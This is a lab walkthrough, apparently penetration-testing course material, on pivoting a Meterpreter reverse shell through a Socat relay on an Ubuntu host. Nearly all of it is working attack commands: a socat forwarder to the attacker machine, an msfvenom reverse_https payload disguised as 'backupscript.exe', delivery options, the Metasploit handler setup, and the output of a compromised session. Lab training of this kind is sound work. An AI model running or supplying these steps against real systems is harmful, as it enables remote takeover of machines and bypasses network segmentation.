### Environment Overview

|   |   |   |
|---|---|---|
|Role|IP Address|Description|
|Attacker Machine|10.10.14.18|Runs Metasploit listener (MSFconsole)|
|Pivot Host|172.16.5.129|Ubuntu Server (running Socat)|
|Target Machine|172.16.5.XX|Windows host executing the payload|

|   |   |   |
|---|---|---|
|Variable|Value|Purpose|
|LHOST|172.16.5.129|Socat listener (pivot host) - payload target|
|LPORT|8080 (pivot)|Port Socat listens on|
|FORWARD TO|10.10.14.18:80|Port on attacker machine for MSF listener|

---

## 1. Start Socat on the Pivot Host (Ubuntu Server)

```Shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

- **Listens on 172.16.5.129:8080 (pivot host)**
- **Forwards incoming connections to attacker machine 10.10.14.18 on port 80**

---

## 2. Generate the Payload on the Attacker Machine

```Shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

- **LHOST (172.16.5.129)**: The pivot host (Ubuntu) where the payload connects
- **LPORT (8080)**: Port that Socat is listening on
- **This payload connects to the Ubuntu host, which forwards it to the attacker**

---

## 3. Transfer Payload to the Target Machine

- Use techniques like `scp`, Python HTTP server, or PowerShell `Invoke-WebRequest` to deliver `backupscript.exe` to the Windows host.

---

## 4. Start Metasploit Handler on Attacker Machine

```Shell
sudo msfconsole
```

Then configure the listener:

```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

- **Listens on all interfaces at port 80**
- **Will receive traffic forwarded by Socat from the Ubuntu pivot**

---

## 5. Execute Payload on Target (Windows Machine)

Once executed:

- The payload connects to **172.16.5.129:8080** (Socat)
- Socat forwards traffic to **10.10.14.18:80**
- The Metasploit handler receives the connection and establishes a session

---

## 6. Confirm Meterpreter Session on Attacker Machine

```Plain
meterpreter > getuid
Server username: INLANEFREIGHT\\victor
```

- A Meterpreter session is opened through the pivot, verified via `getuid`

---